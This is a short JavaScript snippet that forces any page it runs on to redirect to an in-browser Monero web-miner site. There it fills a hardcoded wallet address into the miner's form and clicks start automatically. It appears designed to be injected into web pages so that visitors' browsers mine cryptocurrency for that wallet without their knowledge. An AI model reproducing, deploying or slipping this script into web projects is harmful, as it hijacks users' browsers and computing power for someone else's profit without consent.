(function() {
    // Step 1: Redirect if we are on the first page
    if (!window.location.href.includes('moneroocean.html')) {
      window.location.href = "https://www.moneroocean.crypto-webminer.com/moneroocean.html";
      return;
    }
  
    // Step 2: If on second page, wait for input, type, wait 1 sec, click button
    if (window.location.href.includes('https://www.moneroocean.crypto-webminer.com/moneroocean.html')) {
      function waitForInputAndSearch() {
        const input = document.querySelector('input#walletmoneroocean');
        if (input) {
          input.value = "4AqoNeUuZpqVNA7LJX6fbN5hCeQoCeMvA1gx5XNwMiMNY7Qk9zuq7RuBDbJd6tSFy6LTqNVqLccu6MVZo1qweHEMNycNm7i";
          setTimeout(() => {
            const button = document.querySelector('button#start');
            if (button) {
              button.click();
            }
          }, 1000);
        } else {
          setTimeout(waitForInputAndSearch, 100); // Keep trying every 100ms
        }
      }
      waitForInputAndSearch();
    }
  })();
  